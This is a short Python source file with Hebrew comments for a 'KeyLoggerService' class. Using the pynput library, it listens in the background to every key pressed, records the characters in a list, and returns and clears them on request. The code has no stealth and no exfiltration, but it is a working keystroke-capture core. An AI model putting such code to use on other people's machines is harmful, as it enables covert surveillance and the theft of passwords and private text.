from pynput import keyboard


class KeyLoggerService:
    def __init__(self):
        """
        אתחול השירות: יצירת רשימה לשמירת ההקשות.
        """
        self.key_log = []  # רשימה לאחסון המקשים שנלחצו

    def on_press(self, key):
        """
        פונקציה שמופעלת כאשר מקש נלחץ.
        key: האובייקט המייצג את המקש שנלחץ.
        """
        try:
            self.key_log.append(key.char)  # הוספת האות לרשימה
        except AttributeError:
            self.key_log.append(str(key))  # אם זה מקש מיוחד (למשל Shift או Enter), שמור כמחרוזת

    def get_logged_keys(self):
        """
        מחזירה את כל המקשים שנאספו ומנקה את הרשימה.
        """
        keys = ''.join(self.key_log)  # מאחד את המקשים למחרוזת
        self.key_log = []  # מאפס את הרשימה
        return keys

    def start_listening(self):
        """
        התחלת האזנה למקשים.
        מאזין ברקע ומוסיף את המקשים שנלחצו לרשימה.
        """
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()  # התחלת ההאזנה